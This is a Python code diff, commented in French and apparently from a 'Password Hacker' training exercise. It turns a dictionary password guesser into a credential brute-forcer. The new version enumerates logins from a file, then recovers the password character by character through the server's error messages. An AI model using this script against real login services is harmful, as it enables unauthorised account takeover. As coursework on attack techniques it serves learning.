@@ -1,52 +1,72 @@
 import socket
+import string
 import sys
 import itertools
+import json
+
 
 # cette fonction reformate les elements d'une liste en supprimant le saut de ligne et renvoie la nouvelle valeur
 def reformat(file):
     for line in file:
         line = line.strip("\n")
-        password = str(line)
-        yield password
+        login = str(line)
+        yield login
 
-# cette fonction isole chaque lettre dans une sous-liste à laquelle
-# on ajoute le même lettre mais en majuscule [['g','G'],['o','O']]
-def combinaison(word):
-    combo = []
-    for letter in word:
-        combo.append([letter.lower(), letter.upper()])
-    return combo
 
-# cette fonction cree des mdp à partir des lettres de la liste, alternant entre minuscule et majuscule
+# cette fonction isole lettre par lettre de la liste
 def password_creation(liste):
-    for a in itertools.product(*liste):
-        word = str("".join(a))
-        yield word
+    for i in range(1, 1000000):
+        for a in itertools.product(liste, repeat=i):
+            word = str("".join(a))
+            yield word
 
-# cette fonction envoie une data au serveur et retourne la réponse du serveur decryptée
-def send_response(data):
-    # envoi du mdp au serveur
-    client_socket.send(data)
-    # reception de la réponse du serveur
+
+# cette fonction envoie un dictionnaire au serveur et retourne la réponse du serveur decryptée du Json
+def send_response(login, password):
+    dic = {'login': login, 'password': password}
+    json_dict = json.dumps(dic)
+    # envoi du dico au serveur
+    client_socket.send(json_dict.encode())
+    # reception de la réponse du serveur en Json
     response = client_socket.recv(1024)
-    msg = response.decode()
+    response = response.decode()
+    # conversion du Json en python
+    msg = json.loads(response)
     return msg
 
-# cette fonction teste les differents mdp possibles tant que la reponse du serveur n'est pas positif
-def main(msg,gen):
-    while msg != "Connection success !":
-        # recherche d'un mdp dans le fichier texte
-        password = next(gen)
-        # on teste les differentes ortograhpes du mot
-        combo = combinaison(password)
-        for i in password_creation(combo):
-            data = i.encode()
-            msg = send_response(data)
-            if msg != "Connection success!":
-                continue
-            elif msg == "Connection success!":
-                print(data.decode())
-                return
+
+# cette fonction teste les differents logins possibles tant que la reponse du serveur n'est pas "Wrong password""
+def main(gen):
+    while True:
+        # recherche d'un login dans le fichier texte
+        login = next(gen)
+        msg = send_response(login, " ")
+        re = msg['result']
+        if re == "Wrong login!":
+            continue
+        elif re == "Wrong password!":
+            break
+    password_test(login, "")
+
+
+# cette fonction teste les differents mdp parmi l'alphabet et des nbr, majuscule ou min
+def password_test(login, correct_mdp):
+    alphabet = string.ascii_letters + string.digits
+    generator = password_creation(alphabet)
+    while True:
+        i = next(generator)
+        mdp = correct_mdp + i
+        msg = send_response(login, mdp)
+        re = msg['result']
+        # si le mot testé est correcte, on continue
+        if re == "Exception happened during login":
+            password_test(login, mdp)
+            break
+        elif re == "Connection success!":
+            correct_dic = {'login': login, 'password': mdp}
+            print(json.dumps(correct_dic, indent=4))
+            return
+
 
 # creation d'un socket
 client_socket = socket.socket()
@@ -60,18 +80,16 @@ port = int(args[2])
 address = (hostname, port)
 client_socket.connect(address)
 
-# ouverture du fichier texte
-my_file = open(
-    '/Users/estelle/Desktop/Développement Web/Password Hacker2/Password Hacker/Smarter, dictionary-based brute force/passwords.txt',
-    "r")
+# ouverture du fichier texte de loggin
+my_file = open('/Users/estelle/Desktop/logins.txt', "r")
 # transformation du fichier en une liste
 file_list = my_file.readlines()
-# on reformate les mdp de la liste en str
+# on reformate les logins de la liste en str
 gen = reformat(file_list)
 # variable envoyee a la fonction principale
-msg = ""
+login_dict = {}
 # appel de la fonction principale
-main(msg,gen)
+main(gen)
 # fermeture du fichier texte
 my_file.close()
 # fermeture du serveur
